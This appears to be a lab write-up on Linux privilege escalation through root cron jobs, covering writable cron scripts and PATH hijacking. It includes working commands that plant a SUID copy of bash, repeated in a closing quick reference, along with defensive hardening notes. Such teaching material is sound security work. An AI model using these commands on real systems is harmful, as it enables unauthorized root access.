# Linux PrivEsc: Cron Job Abuse

> Covers the lab's **Task 8 (Cron Jobs — File Permissions)** and **Task 9 (Cron Jobs — PATH Environment Variable)**. Cron jobs are a favorite privilege escalation target because they're **automated, scheduled, and often forgotten** — exactly the kind of "set it and forget it" configuration that accumulates security debt over time.

---

## 0. Background: How Cron Works

`cron` is the standard Unix job scheduler. Root-level scheduled tasks are commonly defined in:

| Location | Notes |
|---|---|
| `/etc/crontab` | System-wide crontab, includes a **user column** (who the job runs as) |
| `/etc/cron.d/*` | Drop-in system cron files, same format as `/etc/crontab` |
| `/etc/cron.hourly/`, `/etc/cron.daily/`, `/etc/cron.weekly/`, `/etc/cron.monthly/` | Directories of scripts run periodically, **always as root** |
| `crontab -l` (per-user) | An individual user's personal crontab, runs **as that user** |

**Format of `/etc/crontab` lines:**
```
# minute hour day month weekday user   command
*/5      *    *   *     *       root   /opt/backup.sh
```

The critical column for privesc purposes is the **user** field — if it says `root`, whatever that line executes runs with full root privileges, **on a schedule you don't control but can predict/wait for.**

### Enumeration
```bash
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.hourly/ /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.monthly/
crontab -l                    # your own
sudo crontab -l -u <user>     # another user's, if you have rights
```

You can also just **watch the system live** to catch cron jobs you don't have read access to configuration for:
```bash
# pspy (no-install, no-root-needed process monitor) — extremely popular in CTFs/real engagements
./pspy64
```
`pspy` is worth calling out specifically: it doesn't require any special privileges and simply watches `/proc` for new process creation, letting you **observe cron jobs firing in real time** even if you can't read the crontab files themselves.

---

## Technique A — Weak File Permissions on Cron Scripts (Task 8)

### The Flaw
A cron job might correctly point to a script, and the crontab entry itself might be locked down fine — but if the **target script** it calls has weak file permissions (writable by your low-privileged user or group), you can simply **edit that script's contents.**

### Example Scenario
```
*/5 * * * * root /opt/scripts/cleanup.sh
```
```bash
ls -l /opt/scripts/cleanup.sh
```
```
-rwxrwxrwx 1 root root 128 Jan 1 12:00 /opt/scripts/cleanup.sh
```
🚩 World-writable (`rwxrwxrwx`), owned by root, run **as** root, on a timer.

### Exploitation
```bash
echo '#!/bin/bash' > /opt/scripts/cleanup.sh
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /opt/scripts/cleanup.sh
```

Wait for the next scheduled run (check the crontab's timing — could be every minute, every 5 minutes, etc.), then:
```bash
/tmp/rootbash -p
```
The `-p` flag tells bash to **preserve privileges** even though it was invoked by a non-root user — normally bash *drops* elevated privileges automatically on startup as a safety feature; `-p` explicitly overrides that.

> 🧠 **Why copy `/bin/bash` and SUID it, instead of just adding a reverse shell to the script directly?** Both work! Copying to a SUID binary is the classic technique because it gives you a **reusable, persistent root shell** you can invoke any time afterward (`/tmp/rootbash -p`) without waiting for the cron job to fire again. A reverse shell payload in the script is simpler for a one-off grab but is "use once" per cron cycle.

---

## Technique B — PATH Environment Variable Hijacking (Task 9)

### The Flaw
This is a more subtle and *very* common real-world finding. Scripts (including cron scripts) frequently call other programs **without specifying the full path** — e.g., writing `tar` instead of `/bin/tar`, or `cp` instead of `/bin/cp`. When executed, the shell resolves that bare command name by searching through the directories listed in the **`PATH`** environment variable, **in order, left to right**, and runs the **first match it finds.**

If:
1. A root-run cron script calls a program **by name only** (no absolute path), **and**
2. Any directory earlier in that script's/environment's `PATH` is writable by your low-privileged user (including, critically, if the crontab file itself **redefines `PATH`** to include something like the current working directory or a shared `/tmp`-like location)...

...then you can drop **your own malicious file with that exact name** into the writable directory, and root will execute *your* file instead of the legitimate one.

### Example Scenario
`/etc/crontab` shows:
```
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/bin

* * * * * root overwrite.sh
```
🚩 **`/home/user` is listed FIRST in `PATH`** — and it's the low-privileged user's own home directory, which they obviously have write access to. The cron job itself runs a script called `overwrite.sh` **by bare name, no absolute path.**

### Exploitation

Suppose the actual script being called by the cron job internally runs something generic like `cp` or a custom internal tool name — for this example let's say the vulnerable cron script itself is invoked by name and PATH-resolved:

```bash
# Create a malicious file with the SAME NAME as what the cron job calls,
# in the directory that appears FIRST in the hijacked PATH
cat << 'EOF' > /home/user/overwrite.sh
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
EOF

chmod +x /home/user/overwrite.sh
```

Wait for the cron trigger, then:
```bash
/tmp/rootbash -p
```

Alternatively — and this is the more commonly tested variant — the cron *script itself* (which IS correctly permissioned and unmodifiable) internally calls **another** binary by bare name (e.g., it runs `tar` for a backup routine). If `PATH` hijacking lets you plant a fake `tar` in a writable, earlier-searched directory, root executes **your** `tar` — which can be anything you want, including a full reverse shell or SUID-bash dropper — instead of the real `/bin/tar`.

```bash
# Fake malicious "tar" binary
echo '#!/bin/bash' > /home/user/tar
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /home/user/tar
chmod +x /home/user/tar
```

---

## How to Spot PATH Hijacking Opportunities

1. **Check crontab files for an explicit `PATH=` line** — and note the *order* of directories.
2. **Check if you have write access to any directory listed BEFORE the standard system directories** (`/usr/bin`, `/bin`, etc.) in that PATH.
3. **Read the actual cron script's contents** (if permissions allow) to see which commands it calls **without an absolute path** — those are your hijack targets.
4. If you *can't* read the script but know it runs periodically, **`pspy` is your best friend** — it'll show you the exact process tree and command-line arguments as they execute, revealing which binaries get called.

---

## Side-by-Side Comparison

| Technique | What's weak | What you modify |
|---|---|---|
| Cron file permissions | The **target script's** file permissions | The script's contents directly |
| Cron PATH hijacking | The **environment `PATH` search order** | A new file, matching a bare command name, placed in an earlier-searched writable directory |

Both exploit the same underlying truth: **cron jobs execute unattended, with whatever privileges their `user` field specifies, and they trust their environment (files + PATH) implicitly.** Any weak link in that chain of trust becomes your escalation path.

---

## Blue Team / Defensive Notes

1. **Never leave scripts run by root writable by non-root users.** Enforce:
   ```bash
   chmod 700 /opt/scripts/*.sh
   chown root:root /opt/scripts/*.sh
   ```
2. **Always use absolute paths inside scripts**, especially those run by cron/systemd timers as root:
   ```bash
   /bin/cp instead of cp
   /usr/bin/tar instead of tar
   ```
3. **Explicitly set a hardened `PATH`** in every crontab/cron.d file, and **never include user-writable directories** (like a home directory or `/tmp`) anywhere in it:
   ```
   PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/bin
   ```
4. **Regularly audit scheduled tasks** as part of hardening reviews:
   ```bash
   find / -type f \( -perm -o+w -o -perm -g+w \) -path "*/cron*" 2>/dev/null
   ```
5. **Use `pspy` yourself, defensively**, or better — proper process auditing via `auditd`/EDR — to spot unexpected process spawns tied to scheduled tasks, which is a strong indicator of exactly this kind of abuse happening in your environment.

---

## Command Quick Reference

```bash
# Enumerate
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/
crontab -l
./pspy64                       # live process observation, no privileges needed

# Technique A: writable cron script
ls -l /path/to/cron_script.sh
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /path/to/cron_script.sh
# wait for trigger, then:
/tmp/rootbash -p

# Technique B: PATH hijack
# 1. find the writable, early-in-PATH directory (often your own home dir)
echo $PATH
# 2. plant a malicious file matching the bare command name the cron job calls
echo -e '#!/bin/bash\ncp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /home/user/<hijacked_name>
chmod +x /home/user/<hijacked_name>
# wait for trigger, then:
/tmp/rootbash -p
```
